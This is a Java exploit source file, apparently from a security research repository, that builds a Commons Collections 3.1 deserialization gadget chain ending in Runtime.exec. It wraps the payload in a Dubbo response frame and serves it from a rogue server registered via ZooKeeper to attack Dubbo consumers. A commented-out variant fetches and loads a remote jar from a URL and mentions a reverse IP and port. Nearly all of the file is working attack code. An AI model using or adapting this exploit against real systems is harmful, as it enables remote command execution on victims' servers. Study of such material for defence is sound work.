package com.threedr3am.bug.dubbo.rouge.java;

import com.threedr3am.bug.common.utils.Reflections;
import com.threedr3am.bug.dubbo.rouge.RougeBase;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
import java.util.Random;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.dubbo.common.io.Bytes;

/*
 Gadget chain:
    java.util.Hashtable.readObject
        java.util.Hashtable.reconstitutionPut
        org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
            org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                org.apache.commons.collections.map.LazyMap.get()
                    org.apache.commons.collections.functors.ChainedTransformer.transform()
                    org.apache.commons.collections.functors.InvokerTransformer.transform()
                    java.lang.reflect.Method.invoke()
                        java.lang.Runtime.exec()
 */


/**
 * commons-collections:commons-collections:3.1
 */
public class CommonsCollections10 extends RougeBase {

    public static void main(String[] args) throws Exception {
        final String[] execArgs = new String[]{args[0]};

        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                execArgs),
            new ConstantTransformer(1)};

        //todo 使用加载远程代码方式
//        final Transformer[] transformers = new Transformer[] {
//            new ConstantTransformer(java.net.URLClassLoader.class),
//            // getConstructor class.class classname
//            new InvokerTransformer("getConstructor",
//                new Class[] { Class[].class },
//                new Object[] { new Class[] { java.net.URL[].class } }),
//            new InvokerTransformer(
//                "newInstance",
//                new Class[] { Object[].class },
//                new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(
//                    "http://127.0.0.1:8080/R.jar") } } }),
//            // loadClass String.class R
//            new InvokerTransformer("loadClass",
//                new Class[] { String.class }, new Object[] { "Cmd" }),
//            // set the target reverse ip and port
//            new InvokerTransformer("getConstructor",
//                new Class[] { Class[].class },
//                new Object[] { new Class[] {} }),
//            // invoke
//            new InvokerTransformer("newInstance",
//                new Class[] { Object[].class },
//                new Object[] { new Object[] {} }),
//            new ConstantTransformer(1) };


        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        Hashtable hashtable = new Hashtable();
        hashtable.put("foo",1);
        // 获取hashtable的table类属性
        Field tableField = Hashtable.class.getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] table = (Object[])tableField.get(hashtable);
        Object entry1 = table[0];
        if(entry1==null)
            entry1 = table[1];
        // 获取Hashtable.Entry的key属性
        Field keyField = entry1.getClass().getDeclaredField("key");
        keyField.setAccessible(true);
        // 将key属性给替换成构造好的TiedMapEntry实例
        keyField.set(entry1, entry);
        // 填充真正的命令执行代码
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        ByteArrayOutputStream jserial2ByteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(jserial2ByteArrayOutputStream);
        objectOutputStream.writeByte(1);
        objectOutputStream.writeObject(hashtable);
        objectOutputStream.flush();
        objectOutputStream.close();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set response event and serialization flag.
        header[2] = (byte) ((byte) 0x20 | 3);
        header[3] = 20;

        // set response id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        Bytes.int2bytes(jserial2ByteArrayOutputStream.size(), header, 12);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(jserial2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        String zookeeperUri = "127.0.0.1:2181";
        String rougeHost = "127.0.0.1";
        int rougePort = 33336;

        new CommonsCollections10().startRougeServer(zookeeperUri, rougeHost, rougePort, bytes, true);
    }

    @Override
    public String getType() {
        return "java";
    }

}
